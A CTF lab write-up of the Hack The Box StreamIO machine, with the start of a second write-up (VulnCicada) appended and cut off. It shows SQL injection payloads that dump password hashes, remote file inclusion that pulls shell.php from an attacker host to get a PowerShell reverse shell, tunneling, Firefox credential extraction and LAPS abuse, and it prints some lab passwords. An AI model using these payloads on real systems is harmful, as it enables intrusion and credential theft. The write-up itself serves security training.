PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-29 21:08:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name) 443/tcp open ssl/https? | ssl-cert: Subject: commonName=streamIO/countryName=EU | Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb | Not valid before: 2022-02-22T07:03:28 |_Not valid after: 2022-03-24T07:03:28 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: 2026-06-29T21:10:56+00:00; +6h59m59s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49668/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC 49732/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2026-06-29T21:09:51 |_ start_date: N/A |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s From the Nmap output, the domain is identified as “streamIO.htb” and the host’s DNS name is not shown. Checking the host’s name with netexec:
└─$ nxc smb 10.129.8.159 -u 'anonymous' -p '' SMB 10.129.8.159 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None) SMB 10.129.8.159 445 DC [-] streamIO.htb\anonymous: STATUS_LOGON_FAILURE From the output, we observed that anonymous authentication is not allowed and the name of the host is shown as “DC”, which should be added to the /etc/hosts file along with the domain. Also, the DNS name “watch.streamIO.htb” is shown in the nmap output for port 443. We will add all to the file as follows:
└─$ sudo nano /etc/hosts 10.129.8.159 streamIO.htb DC.streamIO.htb DC watch.streamIO.htb To sync the system time with the DC:
└─$ sudo ntpdate <TARGET_IP> Initial Access # Web Application Enumeration # After confirming that SMB anonymous authentication is not allowed, we can move to port 80. On port 80, the default page of the IIS server is shown. Checking for hidden directories with Ffuf, but no useful results were obtained as the only directory redirects to 403:
└─$ ffuf -u 'http://10.129.8.159/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.129.8.159/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ aspnet_client [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 95ms] Aspnet_client [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 91ms] aspnet_Client [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 410ms] ASPNET_CLIENT [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 89ms] By Nmap scan, we have a domain (streamio.htb) and subdomain (watch.streamio.htb) running on port 443.
Visiting the domain reveals that it is a movie streaming platform.
In the top right corner, we have a login page to the website. As we don’t have any valid credentials and the default credentials did not work either, we can click the Register button below the Login form, which shows a registration page.
After registering, we checked the credentials on the login form, but it failed and didn’t allow us to log in.
The About and Contact pages do not reveal any useful information, so we moved to directory and files enumeration using Ffuf on the target:
└─$ ffuf -u 'https://streamio.htb/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://streamio.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ css [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 97ms] js [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 98ms] images [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 100ms] admin [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 102ms] Admin [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 99ms] Images [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 98ms] fonts [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 94ms] CSS [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 88ms] ADMIN [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 90ms] JS [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 89ms] Js [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 90ms] Css [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 88ms] IMAGES [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 89ms] Fonts [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 88ms] The “admin” endpoint from the above output is an interesting one, but when tried to access it, it showed a 403 Forbidden message.
Now fuzzing for the .php page revealed the following results:
└─$ ffuf -u 'https://streamio.htb/FUZZ.php' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://streamio.htb/FUZZ.php :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ contact [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 96ms] logout [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 92ms] login [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 121ms] register [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 146ms] about [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 94ms] index [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 96ms] These are the ones we already found from the page’s front end except the logout.php, which will appear once we log in. There might be hidden pages in the “admin” subdirectory and by using Ffuf on it, we found the following results:
└─$ ffuf -u 'https://streamio.htb/admin/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://streamio.htb/admin/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ index.php [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 94ms] . [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 91ms] Index.php [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 94ms] master.php [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 92ms] Navigating to master.php resulted in following error message:
This endpoint may become accessible once we log in to the website.
The website’s subdomain seems to be the actual streaming platform for watching movies. From the front end, we have only a static-looking site with no buttons or pages visible.
After fuzzing for hidden directories first, we got the following results:
└─$ ffuf -u 'https://watch.streamio.htb/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://watch.streamio.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ static [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 405ms] Static [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 89ms] STATIC [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 89ms] Static directory redirects to a 403 page so fuzzing for pages with Ffuf:
└─$ ffuf -u 'https://watch.streamio.htb/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://watch.streamio.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ index.php [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 138ms] favicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 93ms] . [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 684ms] blocked.php [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 89ms] search.php [Status: 200, Size: 253887, Words: 1, Lines: 1, Duration: 269ms] Looking at the blocked.php, we are shown a static page with the message “Malicious Activity detected!! Session Blocked for 5 minutes”:
On search.php, we are shown the list of all the movies’ names accessible on the website.
When searching for some movie name, the search results are returned for the particular keyword and the POST request and response observed in burpsuite are as below.
SQL Injection & Credential Discovery # As the website is taking input and returning results for that particular input, it is possible that the input is being used in some sort of SQL query. Testing for SQL injection, we found that for the query “hour’; – - “, the results are reduced to the ones whose movie names end with the word “hour”. So possibly the SQL query performing the work behind the scenes is something like:
SELECT * FROM allMovies WHERE movieTitle LIKE %['input']% By our SQL payload, the query’s logic is changed to:
SELECT * FROM allMovies WHERE movieTitle LIKE %['hour'; -- - ']% To extract further information using SQLi, we can use UNION injections, but first we need to determine how many columns are returned by the query’s logic. From the front end, only 2 columns are shown, but there may be some in the backend database that are queried but not shown on the page. After trying the UNION injections testing for returned columns, the following payload worked:
qwerty' UNION SELECT 1,2,3,4,5,6; -- - The output is returned for the 2nd and 3rd SELECT columns so our payloads to return data should be targeting these columns. After checking for the version using “SELECT @@version”, the version is identified as
Searching for MSSQL queries for enumerating the databases, tables and columns, we found the following queries:
To list all databases:
SELECT name FROM sys.databases; To list all tables of a database:
SELECT TABLE_NAME FROM <DatabaseName>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'; To list all columns of a table of a database:
SELECT COLUMN_NAME FROM <DatabaseName>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<TABLE_NAME>'; Enumerating the databases reveals six databases, four of which are MSSQL defaults.
qwerty' UNION SELECT 1,name,3,4,5,6 FROM sys.databases; -- - From the remaining 2, I selected “STREAMIO” to further enumerate and list tables with the follwing:
qwerty' UNION SELECT 1,TABLE_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'; -- - The payload resulted in tables “movies” & “users” for the STREAMIO database. Listing the columns of the users table with:
qwerty' UNION SELECT 1,COLUMN_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'; -- - To list the data of username and password columns, we need to use a CONCAT query that outputs both columns in the 2nd column’s output as we can’t use the 3rd column because its type is int.
qwerty' UNION SELECT 1,username + ':' + password,3,4,5,6 FROM users; -- - We can copy the results in a text file and use the following filter to output only the hashes for cracking with Hashcat:
└─$ cut -d':' -f2 username-hashes.txt | sed 's/^ *//' > hashes_only.txt To crack the hashes with Hashcat, we will use MD5 mode (-m 0) as a 32-character hexadecimal hash is commonly indicative of MD5:
└─$ hashcat -m 0 hashes_only.txt /usr/share/wordlists/rockyou.txt The password hashes for following users are successfully cracked:
admin Barry Bruno Clara Juliette Lauren Lenord Michelle Sabrina Thane Victoria yoshihide After trying with Netexec on the SMB port, no credential worked, so now we need to test them on the web login page with Hydra:
└─$ hydra -C username-password.txt -s 443 streamio.htb https-post-form '/login.php:username=^USER^&password=^PASS^:F=Login failed' NOTE: Keep the credentials in the format “username:password” in the file to use with Netexec or Hydra.
We get a valid credential for user “yoshihide” and after login we can now access the previously restricted /admin endpoint.
Remote Code Execution # All the options we see in the image except the “Leave a message for admin” allow us to delete objects like users, staff and movies from the website. The URL parameter also changes with each option. For “User management”, we see it as
https://streamio.htb/admin/?movie= Parameter fuzzing with Ffuf reveals an undocumented debug parameter.
└─$ ffuf -u 'https://streamio.htb/admin/?FUZZ=' -H "Cookie: PHPSESSID=65r6qtodp697m9l9l0e07hnh8g" -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 50 -fc 404 -fs 1678 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : https://streamio.htb/admin/?FUZZ= :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Header : Cookie: PHPSESSID=65r6qtodp697m9l9l0e07hnh8g :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 :: Filter : Response size: 1678 ________________________________________________ debug [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 92ms] movie [Status: 200, Size: 319875, Words: 1, Lines: 1, Duration: 1787ms] staff [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 362ms] user [Status: 200, Size: 3186, Words: 322, Lines: 99, Duration: 92ms] Remembering the “master.php” we identified before that said the error was that it can only be accessed through includes. After trying to use master.php as the parameter’s value, we get a response that contains the output from “User management”, “Staff management” & “Movie management”.
The website is based on PHP so after trying to use the PHP filter in the debug parameter, we get a base64 encoded response, which we can copy from the burpsuite response tab and decode using CyberChef.
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php From the decoded output, the database connection credentials are identified:
Database = STREAMIO UID = db_admin PWD = <Redacted> After fetching and analyzing the PHP code for master.php using PHP filters, we found a Remote File Inclusion leading to an arbitrary PHP code execution vulnerability in the last section of code:
<?php if(isset($_POST['include'])) { if($_POST['include'] !== "index.php" ) eval(file_get_contents($_POST['include'])); else echo(" ---- ERROR ---- "); } ?> When URL wrappers are enabled, file_get_contents() can retrieve content from remote locations. The code is then passing the file’s content to the eval function which executes it. The POST body parameter that fetches a file is “include”. To test for command injection, we can make a shell.php with code:
system("echo Hacked"); Open a python3 HTTP server to serve the payload file:
└─$ python3 -m http.server 8090 We can use curl to include the payload file as follows:
└─$ curl "https://streamio.htb/admin/?debug=master.php" -X POST -H "Cookie: PHPSESSID=<Cookie-Here>" -H "Content-Type: application/x-www-form-urlencoded" -d "include=http://<ATTACKER_IP>:8090/shell.php" --insecure At the end of the response, we can see our injected word is echoed back. To get a reverse shell, we can make a PowerShell reverse shell payload from revshells.com. Select the payload type “PowerShell #3 (Base64)” from available options. Copy and paste the payload in place of “echo Hacked” in the shell.php and request again using curl. Make sure to first start the netcat listener:
rlwrap nc -lvnp <PORT> After receiving the reverse shell, we can see that we get the shell in the context of the “yoshihide” user. The user has no home directory in “C:\Users”:
PS C:\Users> dir Directory: C:\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/22/2022 2:48 AM .NET v4.5 d----- 2/22/2022 2:48 AM .NET v4.5 Classic d----- 2/26/2022 10:20 AM Administrator d----- 5/9/2022 5:38 PM Martin d----- 2/26/2022 9:48 AM nikk37 d-r--- 2/22/2022 1:33 AM Public Internal Network Enumeration # The MSSQL server is running internally and we have credentials for “db_admin”. We can reach the internal network using ligolo-ng for tunneling. We can download the latest compiled binaries from Link for Ligolo Linux Proxy and Ligolo Windows Agent. Download the files according to your system architecture. Apart from the agent, Windows also needs a Wintun driver for the correct working of Ligolo. We can download it from here. After all the files are downloaded, we can start the Ligolo Linux proxy server using:
└─$ ./proxy -selfcert Transfer the Windows Ligolo agent and the wintun.dll driver to the target machine and run the agent:
.\agent.exe -connect <ATTACKER_IP>:11601 -retry -ignore-cert Check the received connection in the proxy server. List the connections with “sessions”, type “1” and press enter. Now we need to create a tunnel interface and activate it with:
└─$ sudo ip tuntap add user $(whoami) mode tun dev ligolo └─$ sudo ip link set ligolo up Then start the tunnel in the proxy server with the “start” command and assign the route to the internal network of the machine with:
└─$ sudo ip route add 240.0.0.1/32 dev ligolo Check if we can successfully reach the internal network by scanning the MSSQL port (1433) with Nmap:
└─$ nmap 240.0.0.1 -p 1433 If this works, we can use impacket-mssqlclient to connect to the MSSQL server using the already obtained db_admin credentials as follows:
└─$ impacket-mssqlclient ./db_admin:'<Password>'@240.0.0.1 Using SQL injection, we identified before that there were 2 non-default databases and we enumerated only one. Now as we have db_admin privileges, we can enumerate the 2nd (streamio_backup) and see what it contains. Select the database to use with “use streamio_backup”. We can list the tables with the query:
SQL (db_admin db_admin@streamio_backup)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'; TABLE_NAME ---------- movies users To enumerate columns of the “users” table:
SQL (db_admin db_admin@streamio_backup)> SELECT COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'; COLUMN_NAME DATA_TYPE ----------- --------- id int username nchar password nchar To output the columns’ data of the users table:
SQL (db_admin db_admin@streamio_backup)> SELECT * FROM users; We will get usernames along with their password hashes. The password hash of username “nikk37” is important, as it’s a domain user and also has a home profile in C:\Users. We can crack the hash with Hashcat using:
└─$ hashcat -m 0 '<hash-here>' /usr/share/wordlists/rockyou.txt The hash is cracked and we can confirm the validity of the password using Netexec:
└─$ netexec smb 10.129.8.250 -u nikk37 -p '<password>' SMB 10.129.8.250 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None) SMB 10.129.8.250 445 DC [+] streamIO.htb\nikk37:<REDACTED> Now we can collect the Active Directory domain data using Bloodhound for analysis:
└─$ bloodhound-ce-python -c all -u 'nikk37' -p 'get_dem_girls2@yahoo.com' -d 'streamio.htb' -ns 10.129.8.159 --dns-tcp --zip --dns-timeout 90 Start the Bloodhound web GUI with “bloodhound-start” and import the zip file.
The “Outbound Object Control” section for nikk37 is blacked out, so this means our user has no privileges over other objects. To confirm this, we can use bloodyad:
└─$ bloodyad -u nikk37 -p '<password>' -d streamio.htb -i <TARGET_IP> get writable distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=streamIO,DC=htb permission: WRITE distinguishedName: CN=nikk37,CN=Users,DC=streamIO,DC=htb permission: WRITE distinguishedName: DC=streamIO.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=streamIO,DC=htb permission: CREATE_CHILD distinguishedName: DC=_msdcs.streamIO.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=streamIO,DC=htb permission: CREATE_CHILD There is no interesting AD privilege. As the user is in the “Remote Management Users” group, we can log in using evil-winrm:
└─$ evil-winrm -i <TARGEET_IP> -u 'nikk37' -p '<password>' The user flag can be retrieved from the nikk37 desktop directory:
*Evil-WinRM* PS C:\Users\nikk37\Documents> type C:\Users\nikk37\Desktop\user.txt Escalating Privileges # Local Enumeration # Checking for the user’s system privileges also didn’t yield anything interesting:
*Evil-WinRM* PS C:\Users\nikk37\> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled We can transfer the winPEAS binary to the host for automated enumeration and run it with a command that shows the output on screen as well as saves it in a file:
*Evil-WinRM* PS C:\Users\nikk37\> .\winPEASx64.exe | Tee-Object -FilePath winPEASOutput.txt The script identified that Firefox may contain saved credentials in the key4.db file and gave a link to the tool that can extract the credentials. The mentioned tool didn’t work, but after searching for another decryptor, I found one at the link. Download the tool to the attacker machine. The tool needs “key4.db” & “logins.json” to extract the credentials. As we have an evil-winrm session, we can download the files with:
*Evil-WinRM* PS C:\Users\nikk37\> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db" ./ *Evil-WinRM* PS C:\Users\nikk37\> download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json" ./ Extract the credentials by pointing the tool to the directory where the two downloaded files are saved:
└─$ python3 firepwd.py -d /path/to/files The extracted credentials can be seen at the bottom of the tool’s output. There are credentials for another domain user “JDgodd”. The password that worked for the JDgodd user is the password extracted for the user “admin”.
Active Directory Privilege Escalation # Analyzing the domain privileges of this user, we found out that it owns the “Core Staff” group as well as has WriteOwner privileges over it.
The mentioned group can then read the LAPS password on the DC computer.
We can assign JDgodd GenericAll privileges over the group with bloodyad:
└─$ bloodyad -u JDgodd -p '<password>' -d streamio.htb -i 10.129.8.250 add genericAll 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'JDgodd' [+] JDgodd has now GenericAll on CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB Now we can add ourselves to the group:
└─$ bloodyad -u JDgodd -p '<password>' -d streamio.htb -i 10.129.8.250 add groupMember 'Core Staff' 'JDgodd' [+] JDgodd added to Core Staff LAPS Abuse & Administrator Access # As we get the privilege to read the LAPS password on the DC computer by being the member of the group, we can use Netexec “laps” module to extract the password:
└─$ nxc ldap 10.129.8.250 -u JDgodd -p '<password>' -M laps LDAP 10.129.8.250 389 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert) LDAP 10.129.8.250 389 DC [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r LAPS 10.129.8.250 389 DC [*] Getting LAPS Passwords LAPS 10.129.8.250 389 DC Computer:DC$ User: Password:<REDACTED> As the LAPS stores the local Administrator password, we can now log in to the target with the Administrator credentials using evil-winrm:
└─$ evil-winrm -i 10.129.8.250 -u 'Administrator' -p '<password>'
summary: Exploitation chain involving SQL injection, source code disclosure, remote code execution, internal MSSQL enumeration, BloodHound analysis, and LAPS abuse.
title: StreamIO Machine Writeup | HTB

content:
Summary # VulnCicada is a Medium-difficulty Windows Active Directory machine that begins with the discovery of a password hidden in an image exposed through an anonymous NFS share. The recovered credentials provide access to domain resources, leading to the identification of an AD CS ESC8 misconfiguration. Since NTLM is disabled, Kerberos relay is achieved by abusing the marshal/unmarshal SPN behavior to bypass self-relay restrictions and obtain a certificate for the Domain Controller machine account. This certificate is then used to authenticate as the DC, perform a DCSync attack, recover the Administrator’s credentials, and fully compromise the domain.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total 65535 possible ports
└─$ rustscan -a 10.129.234.48 -r 0-65535 PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49473/tcp open unknown syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49715/tcp open unknown syn-ack ttl 127 56576/tcp open unknown syn-ack ttl 127 56577/tcp open unknown syn-ack ttl 127 56595/tcp open unknown syn-ack ttl 127 56662/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.234.48 -T4 -sC -sV -Pn -p 53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,9389,49473,49664,49667,49715,56576,56577,56595,56662 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-11 09:14 +0500 Nmap scan report for 10.129.234.48 Host is up (0.46s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-11 04:14:12Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl, 2027-07-11T03:53:25 |_ssl-date: TLS randomness does not represent time 2049/tcp open nlockmgr 1-4 (RPC #100021) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl | Subject Alternative Name: othername: Microsoft Windows RPC 56576/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 56577/tcp open msrpc Microsoft Windows RPC 56595/tcp open msrpc Microsoft Windows RPC 56662/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 0s | smb2-time: | date: 2026-07-11T04:15:14 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and require As from the output above, the Domain is “cicada.vl” and the DNS name of the host is “DC-JPQ225.cicada.vl”. We can add these entries to our /etc/hosts file:
sudo nano /etc/hosts └─$ 10.129.234.48 DC-JPQ225.cicada.vl DC-JPQ225 cicada.vl To sync the system time with the DC:
└─$ sudo ntpdate 10.129.234.48 Initial Access # NFS Enumeration # We start with enumerating the NFS share port 2049 as we don’t have valid domain credentials. To see what shares are available, we can use command:
